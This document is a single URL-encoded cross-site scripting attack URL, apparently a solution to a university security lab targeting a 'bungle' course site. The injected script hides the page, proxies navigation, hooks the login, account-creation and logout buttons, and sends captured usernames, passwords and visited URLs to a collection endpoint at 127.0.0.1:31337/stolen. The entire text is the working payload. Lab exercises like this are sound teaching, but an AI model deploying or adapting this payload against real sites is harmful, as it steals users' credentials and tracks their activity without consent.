http://bungle-cs461.cs.illinois.edu/search?xssdefense=4&q=%3Cscript%3Efunction%20payload(attacker)%20%7B%0A%20%20function%20log(data)%20%7B%0A%20%20%20%20%24.get(attacker%2C%20data)%0A%20%20%7D%0A%20%20function%20proxy(href)%20%7B%0A%20%20%20%20%24(%60html%60).load(href%2C%20function()%7B%0A%20%20%20%20%20%20target%20%3D%20%60http%3A%2F%2Fbungle-cs461.cs.illinois.edu%2F%60%0A%20%20%20%20%20%20%24(%60html%60).show()%0A%20%20%20%20%20%20%24(%60a%60).filter(%60%3Acontains(%3Cscript%3E)%60).remove()%0A%20%20%20%20%20%20var%20user%20%3D%20%24(%60%23logged-in-user%60).text()%0A%20%20%20%20%20%20window.onpopstate%3D%20function(event)%7B%0A%20%20%20%20%20%20%20%20proxy(document.location.href.split(%60.edu%60)%5B1%5D)%0A%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20if(user!%3Dnull)%7Blog(%7Bevent%3A%20%60nav%60%2C%20usr%3A%20user%2C%20url%3A%20href%7D)%7D%0A%20%20%20%20%20%20else%7Blog(%7Bevent%3A%20%60nav%60%2C%20url%3A%20href%7D)%7D%0A%20%20%20%20%20%20if(!history.state)%0A%20%20%20%20%20%20%20%20history.replaceState(null%2C%20null%2C%20href)%0A%20%20%20%20%20%20function%20post_helper(suffix)%7B%0A%20%20%20%20%20%20%20%20var%20name%20%3D%20%24(%60%23username%60).val()%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20passwd%20%3D%20%24(%60%23userpass%60).val()%0A%20%20%20%20%20%20%20%20%20%20%20%20log(%7Bevent%3A%20%60login%60%2C%20user%3A%20name%2C%20pass%3A%20passwd%7D)%0A%20%20%20%20%20%20%20%20%24.post(target%2Bsuffix%2C%20%7Busername%3A%20name%2C%20password%3A%20passwd%7D%2C%20function()%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20proxy(%60.%2F%60)%0A%20%20%20%20%20%20%20%20%7D)%7D%0A%20%20%20%20%20%20%24(%60%23search-btn%60).click(function(event)%7B%0A%20%20%20%20%20%20%20%20event.preventDefault()%0A%20%20%20%20%20%20%20%20var%20q%20%3D%20%24(%60%23query%60).val()%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20q_url%20%3D%20%60search%3Fq%3D%60%20%2B%20q%0A%20%20%20%20%20%20%20%20history.pushState(href%2C%20null%2C%20q_url)%0A%20%20%20%20%20%20%20%20proxy(q_url)%0A%20%20%20%20%20%20%7D)%0A%20%20%20%20%20%20%24(%60%23search-again-btn%2C%20%23bungle-lnk%60).click(function(event)%7B%0A%20%20%20%20%20%20%20%20event.preventDefault()%0A%20%20%20%20%20%20%20%20history.pushState(null%2C%20null%2C%20href)%0A%20%20%20%20%20%20%20%20proxy(%60.%2F%60)%0A%20%20%20%20%20%20%7D)%0A%20%20%20%20%20%20%24(%60%23log-in-btn%60).click(function(event)%7B%0A%20%20%20%20%20%20%20%20event.preventDefault()%0A%20%20%20%20%20%20%20%20post_helper(%60login%60)%0A%20%20%20%20%20%20%7D)%0A%20%20%20%20%20%20%24(%60%23new-account-btn%60).click(function(event)%7B%0A%20%20%20%20%20%20%20%20event.preventDefault()%0A%20%20%20%20%20%20%20%20post_helper(%60create%60)%0A%20%20%20%20%20%20%7D)%0A%20%20%20%20%20%20%24(%60%23log-out-btn%60).click(function(event)%7B%0A%20%20%20%20%20%20%20%20event.preventDefault()%0A%20%20%20%20%20%20%20%20log(%7Bevent%3A%20%60logout%60%2Cusr%3A%20%24(%60%23username%60).val()%7D)%0A%20%20%20%20%20%20%20%20%24.post(target%20%2B%20%60logout%60%2C%20function()%7B%0A%20%20%20%20%20%20%20%20%20%20history.pushState(null%2C%20null%2C%20target%20%2B%20%60logout%60)%0A%20%20%20%20%20%20%20%20%20%20proxy(%60.%2F%60)%0A%20%20%20%20%20%20%20%20%7D)%0A%20%20%20%20%20%20%7D)%0A%20%20%20%20%7D)%0A%20%20%7D%0A%20%20%24(%60html%60).hide()%0A%20%20proxy(%60.%2F%60)%0A%7D%0Apayload(%60http%3A%2F%2F127.0.0.1%3A31337%2Fstolen%60)%0A%3C%2Fscript%3E
